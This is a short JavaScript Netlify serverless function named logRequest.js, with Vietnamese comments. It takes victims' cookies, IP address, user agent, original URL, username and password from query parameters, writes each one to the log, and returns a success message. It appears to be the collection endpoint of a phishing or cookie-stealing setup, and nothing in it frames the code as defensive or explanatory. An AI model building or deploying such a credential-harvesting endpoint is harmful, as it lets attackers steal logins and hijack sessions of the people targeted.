// netlify-functions/logRequest.js

exports.handler = async (event, context) => {
  const cookies = event.queryStringParameters.cookies || "No cookies";
  const userAgent = event.queryStringParameters.userAgent || "No user agent";
  const userIP = event.queryStringParameters.userIP || "No IP";
  const url = event.queryStringParameters.url || "No URL";
  const username = event.queryStringParameters.username || "No username";
  const password = event.queryStringParameters.password || "No password";

  // Ghi thông tin vào log
  console.log(`Cookies: ${cookies}`);
  console.log(`User Agent: ${userAgent}`);
  console.log(`IP: ${userIP}`);
  console.log(`URL (Original URL): ${url}`);
  console.log(`Username: ${username}`);
  console.log(`Password: ${password}`);

  return {
    statusCode: 200,
    body: JSON.stringify({ message: "Data received successfully!" }),
  };
};
